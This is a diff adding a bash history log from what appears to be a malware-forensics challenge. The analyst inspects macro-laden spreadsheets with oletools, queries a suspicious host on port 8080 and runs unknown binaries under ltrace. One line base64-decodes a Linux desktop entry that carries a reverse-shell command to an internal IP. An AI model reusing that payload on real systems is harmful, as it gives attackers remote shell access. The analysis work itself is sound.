@@ -1,0 +1,201 @@
+
+    1  apt-get 
+    2  apt-get update
+    3  apt-get install git gcc python3-dev python3-pip
+    4  pip3 install viper-framework
+    5  apt-get -y install libfuzzy-dev
+    6  pip3 install viper-framework
+    7  pip install --upgrade pip
+    8  pip install --upgrade pip3
+    9  apt-get install libssl-dev swig libffi-dev ssdeep libfuzzy-dev unrar-free p7zip-full
+   10  viper
+   11  apt-get install exiftool
+   12  apt-get install clamav-daemon
+   13  apt-get install -y tor ; apt-get install -y libdpkg-perl
+   14  viper
+   15  pip install yara-python
+   16  viper
+   17  pip install virustotal-api 
+   18  pip3 install virustotal-api 
+   19  viper
+   20  viper
+   21  viper
+   22  viper
+   23  curl
+   24  apt install curl
+   25  curl http://windowsliveup
+   26  curl -v http://windowsliveup
+   27  curl -v http://windowsliveupd
+   28  curl ater.com:8080/news
+   29  curl -v ater.com:8080/news
+   30  curl -vvvv ater.com:8080/news
+   31  curl -vvvv ater.com:8080
+   32  lynx
+   33  apt install lynx
+   34  lynx ater.com:8080/news
+   35  lynx ater.com
+   36  ls
+   37  ls -lrta
+   38  olevba 
+   39  olevba -f forensics_information.zip 
+   40  olevba -f forensics_information.zip 
+   41  olevba -f forensics_information.zip 
+   42  python olevba -f forensics_information.zip 
+   43  python olevba -f forensics_information.zip 
+   44  olevba -f staff_info.xls 
+   45  olevba --code staff_info.xls 
+   46  olevba --code staff_info.xls  | grep hta
+   47  olevba --code staff_info.xls  | grep htb
+   48  olevba --code staff_info.xls  | grep Function
+   49  olevba --code staff_info.xls >> vb_code.vba
+   50  grep htb vb_code.vba
+   51  grep hta vb_code.vba 
+   52  grep txt vb_code.vba 
+   53  vi vb_code.vba 
+   54  cat vb_code.vba 
+   55  clear
+   56  cat vb_code.vba 
+   57  lynx http://windowsliveupdate.com:8080/news
+   58  ls
+   59  ls -lrt
+   60  olevba congratulations.xlsm 
+   61  file congratulations.xlsm 
+   62  head congratulations.xlsm 
+   63  ls
+   64  ls -lrta
+   65  file congratulations.xlsm 
+   66  olefile congratulations.xlsm 
+   67  history
+   68  viper
+   69* 
+   70  history 
+   71  history >> history-forensic.log 
+   72  wc -l history-forensic.log 
+   73  viper 
+   74  oledump
+   75  mraptor congratulations.xlsm 
+   76  olevba congratulations.xlsm 
+   77  oleid congratulations.xlsm 
+   78  msodde congratulations.xlsm 
+   79  pyxswf congratulations.xlsm 
+   80  oleobj congratulations.xlsm 
+   81  rtfobj congratulations.xlsm 
+   82  file congratulations.xlsm 
+   83  ls
+   84  ls -lrt
+   85  file erasure 
+   86  strings -n erasure 
+   87  strings -n 10 erasure 
+   88  chmod a+x erasure 
+   89  ./erasure 
+   90  ls
+   91  ls -lrt
+   92  cat flag.txt 
+   93  chmod +x erasure 
+   94  ./erasure 
+   95  ls
+   96  ls -lrta
+   97  ltrace 
+   98  apt install ltrace 
+   99  ltrace ./erasure 
+  100  ls
+  101  ls -lrt
+  102  strings -n 10 uncoding 
+  103  chmod +x uncoding 
+  104  ./uncoding 
+  105  ltrace uncoding
+  106  ltrace ./uncoding
+  107  ltrace ./uncoding
+  108  git clone https://github.com/radareorg/radare2
+  109  cd radare2/sys/
+  110  ./install.sh 
+  111  r2
+  112  cd /
+  113  r2 uncoding 
+  114  r2 -AA uncoding 
+  115  r2 uncoding 
+  116  r2 uncoding 
+  117  r2 
+  118  r2 -help
+  119  r2 uncoding 
+  120  r2 uncoding 
+  121  echo > history-forensic.log 
+  122  history >> history-forensic.log 
+    1  pip install pyclamd
+    2  pip install pyclamd
+    3  apt-get install pyexiftool 
+    4  pip install pyexiftool
+    5  pip3 install lief)
+    6  pip3 install lief
+    7  pip install python-oletools
+    8  pip install -U oletoolssudo -H pip install -U oletools
+    9  pip install -U oletools
+   10  python
+   11  olevba
+   12  olevba staff_info.xls 
+   13  olevba staff_info.xls  --decode
+   14  olevba staff_info.xls  --reveal
+   15  olevba staff_info.xls 
+   16  olevba -h
+   17  olevba staff_info.xls -d
+   18  olevba -d staff_info.xls 
+   19  olevba -d staff_info.xls --decode
+   20  MacroRaptor:
+   21  MacroRaptor
+   22  mraptor
+   23  mraptor staff_info.xls 
+   24  mraptor -X staff_info.xls 
+   25  mraptor msoddestaff_info.xls 
+   26  msodde
+   27  msodde staff_info.xls 
+   28  oledump
+   29  apt install git
+   30  git clone https://github.com/DidierStevens/DidierStevensSuite.git
+   31  cd DidierStevensSuite
+   32   
+   33  ls
+   34  ls
+   35  ls -lrt
+   36  oledump.py -s htb ../staff_info.xls 
+   37  python oledump.py -s htb ../staff_info.xls 
+   38  python oledump.py  ../staff_info.xls 
+   39  pyxswf 
+   40  pyxswf -x ../staff_info.xls 
+   41  olevba ../staff_info.xls 
+   42  cd ../
+   43  ls
+   44  ls -lrt
+   45  staff_info.xls 
+   46  wget ater.com:8080/news
+   47  wget ater.com:8080
+   48  wget ater.com
+   49  vi index.html 
+   50  cat index.html 
+   51  cat index.html  | grep -i htp
+   52  cat index.html  | grep -i htb
+   53  viper
+   54  curl
+   55  apt install curl
+   56  curl 
+   57  url="http://windowsliveupdate.com:8080/news"
+   58  curl -vvv $url
+   59  olevba ../staff_info.xls 
+   60  olevba ../staff_info.xls
+   61  olevba ../staff_info.xls
+   62  history | grep olevba 
+   63  history | grep ole
+   64  echo "W0Rlc2t0b3AgRW50cnldClR5cGU9QXBwbGljYXRpb24KTmFtZT1TdXBwb3J0CkV4ZWM9YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzU5MTIgMD4mMSIKQ29tbWVudD1TRlJDZTJJeGRHSjFZMnN6ZERWZmNIVmliREZqWDNJemNEQnpYMmN3WDJKeWNuSWhJWDBLCg==" | base64 -d
+   65  pip install python-idb 
+   66  history 
+   67  history  > history-forensic.log
+   68  ltrace uncoding 
+   69  ls
+   70  ls -lrta
+   71  ltrace uncoding 
+   72  ltrace uncoding 
+   73  chmod +x uncoding 
+   74  ./uncoding 
+   75  ltrace ./uncoding 
+   76  ls -lrt
+   77  file uncoding 
+   78  history >> history-forensic.log
